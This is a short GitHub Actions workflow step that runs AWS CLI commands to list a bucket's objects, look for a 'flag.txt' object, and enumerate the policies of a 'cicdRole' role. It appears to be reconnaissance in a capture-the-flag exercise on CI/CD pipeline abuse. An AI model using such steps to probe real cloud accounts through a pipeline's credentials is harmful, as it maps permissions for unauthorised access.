      - name: Inspect S3 and IAM permissions
        run: |
          echo "=== LIST BUCKET ==="
          aws s3api list-objects-v2 \
            --bucket codec4f26c862a321ef5 \
            --max-keys 20 || true

          echo "=== CHECK FLAG PREFIX ==="
          aws s3api list-objects-v2 \
            --bucket codec4f26c862a321ef5 \
            --prefix flag.txt \
            --max-keys 20 || true

          echo "=== ATTACHED ROLE POLICIES ==="
          aws iam list-attached-role-policies \
            --role-name cicdRole || true

          echo "=== INLINE ROLE POLICIES ==="
          aws iam list-role-policies \
            --role-name cicdRole || true
